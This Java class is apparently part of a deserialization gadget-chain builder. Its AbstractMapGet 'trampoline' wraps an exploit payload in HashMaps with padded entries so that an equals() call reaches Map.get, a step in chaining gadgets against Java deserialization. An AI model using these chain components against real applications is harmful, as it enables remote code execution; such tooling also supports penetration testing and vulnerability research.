package org.ses.gadgetbuilder.impl.trampolines.mapget;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.chains.trampolines.singleparam.MapGetTrampoline;
import org.ses.gadgetbuilder.impl.trampolines.equals.HashMapEquals;

import java.util.HashMap;
import java.util.Map;

/**
 * https://github.com/openjdk/jdk/blob/master/src/java.base/share/classes/java/util/AbstractMap.java#L453
*/
@Dependencies()
@Authors(Authors.BK)
public class AbstractMapGet implements MapGetTrampoline {

    @Override
    public Object wrapPayload(Object payload, Object param) throws Exception {

        Map equalsMap = new HashMap();
        equalsMap.put(param, "foo");

        // make payload map size match
        Map payloadMap = (Map) payload;

        if (payloadMap.size() == 0) {
            payloadMap.put("foo", "bar");
        } else {
            for (int i = 1; i < payloadMap.size(); i++) {
                equalsMap.put("Aa" + i, "Bb" + i);
            }
        }

        HashMapEquals equalsTrampoline = new HashMapEquals();
        return equalsTrampoline.wrapPayload(equalsMap, payload);
    }
}
